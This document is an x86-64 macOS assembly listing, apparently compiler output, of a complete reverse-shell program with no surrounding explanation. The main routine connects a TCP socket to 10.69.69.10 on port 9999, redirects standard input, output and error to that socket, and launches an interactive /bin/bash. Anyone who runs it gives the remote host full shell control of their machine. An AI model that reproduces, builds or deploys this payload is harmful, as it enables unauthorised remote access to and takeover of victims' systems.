	.cstring
LC0:
	.ascii "10.69.69.10\0"
LC1:
	.ascii "-i\0"
LC2:
	.ascii "/bin/bash\0"
	.text
.globl _main
_main:
LFB16:
	pushq	%rbp
LCFI0:
	movq	%rsp, %rbp
LCFI1:
	subq	$48, %rsp
LCFI2:
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rdx
	movq	%rdx, -8(%rbp)
	xorl	%edx, %edx
	movl	$0, %edx
	movl	$1, %esi
	movl	$2, %edi
	call	_socket
	movl	%eax, -36(%rbp)
	movb	$2, -31(%rbp)
	movw	$3879, -30(%rbp)
	leaq	LC0(%rip), %rdi
	call	_inet_addr
	movl	%eax, -28(%rbp)
	leaq	-32(%rbp), %rax
	leaq	8(%rax), %rdi
	movl	$8, %edx
	movl	$0, %esi
	call	_memset
	leaq	-32(%rbp), %rsi
	movl	-36(%rbp), %edi
	movl	$16, %edx
	call	_connect
	movl	-36(%rbp), %edi
	movl	$0, %esi
	call	_dup2
	movl	-36(%rbp), %edi
	movl	$1, %esi
	call	_dup2
	movl	-36(%rbp), %edi
	movl	$2, %esi
	call	_dup2
	movl	$0, %ecx
	leaq	LC1(%rip), %rdx
	leaq	LC2(%rip), %rsi
	leaq	LC2(%rip), %rdi
	movl	$0, %eax
	call	_execl
	movl	-36(%rbp), %edi
	call	_close
	movl	$0, %eax
	movq	___stack_chk_guard@GOTPCREL(%rip), %rdx
	movq	-8(%rbp), %rcx
	xorq	(%rdx), %rcx
	je	L3
	call	___stack_chk_fail
L3:
	leave
	ret
LFE16:
	.section __TEXT,__eh_frame,coalesced,no_toc+strip_static_syms+live_support
EH_frame1:
	.set L$set$0,LECIE1-LSCIE1
	.long L$set$0
LSCIE1:
	.long	0x0
	.byte	0x1
	.ascii "zR\0"
	.byte	0x1
	.byte	0x78
	.byte	0x10
	.byte	0x1
	.byte	0x10
	.byte	0xc
	.byte	0x7
	.byte	0x8
	.byte	0x90
	.byte	0x1
	.align 3
LECIE1:
.globl _main.eh
_main.eh:
LSFDE1:
	.set L$set$1,LEFDE1-LASFDE1
	.long L$set$1
LASFDE1:
	.long	LASFDE1-EH_frame1
	.quad	LFB16-.
	.set L$set$2,LFE16-LFB16
	.quad L$set$2
	.byte	0x0
	.byte	0x4
	.set L$set$3,LCFI0-LFB16
	.long L$set$3
	.byte	0xe
	.byte	0x10
	.byte	0x86
	.byte	0x2
	.byte	0x4
	.set L$set$4,LCFI1-LCFI0
	.long L$set$4
	.byte	0xd
	.byte	0x6
	.align 3
LEFDE1:
	.subsections_via_symbols
